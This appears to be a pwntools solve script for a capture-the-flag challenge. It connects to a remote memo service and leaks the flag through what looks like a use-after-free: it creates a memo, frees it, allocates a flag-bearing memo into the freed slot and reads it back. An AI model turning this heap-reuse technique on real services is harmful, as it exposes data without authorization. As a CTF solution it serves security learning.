#!/usr/bin/python3
from pwn import *

# Establishing the connection with the remote server
conn = remote("ctf99.cs.ui.ac.id", 1020)

# Create a memo at index 0
conn.sendlineafter(b": ", b"1")
conn.sendlineafter(b": ", b"0")
conn.sendlineafter(b": ", b"flag")

# Delete the memo at index 0
conn.sendlineafter(b": ", b"3")
conn.sendlineafter(b": ", b"0")

# Create a special memo (containing flag) at index 1
conn.sendlineafter(b": ", b"4")
conn.sendlineafter(b"? ", b"1")

# Print the memo at index 0, which now contains the flag
conn.sendlineafter(b": ", b"2")
conn.sendlineafter(b": ", b"0")

# Switch to interactive mode to read the flag
conn.interactive()
